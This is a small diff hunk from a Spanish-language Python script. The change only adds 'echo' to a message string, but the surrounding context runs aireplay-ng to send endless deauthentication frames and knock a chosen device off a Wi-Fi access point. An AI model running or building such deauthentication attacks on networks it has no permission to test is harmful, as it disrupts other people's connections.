@@ -53,7 +53,7 @@ def main():
     # Intentar desautenticar el dispositivo
     print(f"\nEnviando desautenticación al dispositivo {station}...")
     ejecutar_comando(f"aireplay-ng -0 0 -a {bssid} -c {station} {tarjeta_red}")
-    abrir_en_ventana("Se esta mandando ping al Dispositivo ingresado, para que pare oprime CTRL + C, y recupera tu conexion estable con el comando airmon-ng stop _____ en el espacio coloca el nombre de la tarjeta de red", "INDICACIONES")
+    abrir_en_ventana("echo Se esta mandando ping al Dispositivo ingresado, para que pare oprime CTRL + C, y recupera tu conexion estable con el comando airmon-ng stop _____ en el espacio coloca el nombre de la tarjeta de red", "INDICACIONES")
 
     print("\nSi este no es el dispositivo deseado, reinicia el script y prueba con otro STATION.\n")
 
